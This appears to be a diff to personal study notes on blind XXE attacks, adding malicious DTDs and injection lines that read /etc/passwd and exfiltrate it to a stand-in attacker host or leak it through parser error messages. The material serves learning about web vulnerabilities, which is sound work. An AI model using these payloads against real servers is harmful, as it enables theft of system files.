@@ -229,7 +229,15 @@ This XXE payload declares an XML parameter entity called `xxe` and then uses the
 ### Exploiting blind XXE to exfiltrate data out-of-band
 An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:
 
-`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;`
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd"> 
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://COllbrabter/?x=%file;'>"> 
+%eval; 
+%exfiltrate;
+```
+you should put this into website  you have then
+into the request of vulnerable website you put this 
+`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YourWebsite"> %xxe; ]>`
 
 This DTD carries out the following steps:
 
@@ -237,3 +245,16 @@ This DTD carries out the following steps:
 - Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
 - Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
 - Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.
+
+### Exploiting blind XXE to retrieve data via error messages
+
+You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:
+
+`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;`
+
+This DTD carries out the following steps:
+
+- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
+- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
+- Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
+- Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.
